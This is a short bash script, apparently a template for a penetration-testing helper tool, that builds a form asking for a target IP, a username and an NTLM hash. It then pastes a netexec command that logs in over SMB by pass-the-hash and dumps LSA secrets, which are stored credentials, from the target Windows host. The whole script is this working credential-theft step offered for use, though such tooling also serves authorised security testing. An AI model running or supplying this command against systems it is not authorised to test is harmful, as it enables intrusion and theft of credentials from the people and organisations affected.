#!/bin/bash

: '
dump lsa
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item "IP address" "IP")
USERNAME_FIELD=$(form_item "Username" "username" "administrators")
HASH_FIELD=$(form_item "Hash" "Hash")

# Generate GUI form
generate_form "${IP_FIELD}" "${USERNAME_FIELD}" "${HASH_FIELD}"

IP=${form_data["IP"]}
USERNAME=${form_data["username"]}
HASH=${form_data["Hash"]}

paste_command "netexec smb ${IP} --local-auth -u '${USERNAME}' -H ${HASH} --lsa"